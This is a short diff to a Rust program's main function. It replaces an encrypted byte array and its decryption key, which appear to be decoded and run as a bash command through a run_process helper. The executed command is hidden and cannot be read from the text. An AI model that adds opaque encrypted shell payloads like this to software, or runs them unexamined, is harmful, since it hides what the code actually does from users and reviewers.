@@ -77,8 +77,8 @@ fn run_process(iterp: &String, prog: &String, args: &Vec<String>) {
 }
 
 fn main() {
-    let prog = vec![67, 104, 58, 160, 146, 106, 74, 216, 76, 229, 166, 181, 246, 185, 117, 192, 218, 234, 107, 218, 18, 21, 48, 137, 195, 151, 183, 143, 155, 59, 114, 249, 139, 224, 255, 243, 134, 58, 186, 114, 58, 118, 220, 31, 144, 213, 189, 252, 82, 236, 8, 153, 99, 184, 14, 49, 222, 187];
-    let rand_key = "qIwUqjwgZ7noFGtBFkaGmQp9Ni5xpzjj8GnU8XbXreIVCN79crlvVi9KXRsbw4MT0T9mZgfIoXMRwKvuSTX6jeTET7oFYqbHjJjEVuliQO9DggENTlgZ1u9sjuhWdOE2";
+    let prog = vec![193, 73, 211, 99, 208, 19, 143, 242, 102, 88, 47, 216, 5, 36, 48, 26, 242, 13, 62, 173, 59, 27, 162, 196, 241, 172, 150, 18, 124, 145, 236, 210, 1, 199, 2, 251, 174, 203, 209, 21, 66, 66, 1, 77, 93, 119, 157, 212, 177, 46, 143, 169, 227, 7, 54, 25, 213, 249];
+    let rand_key = "test now";
     let pass = "";
     let iterp = "bash";
 
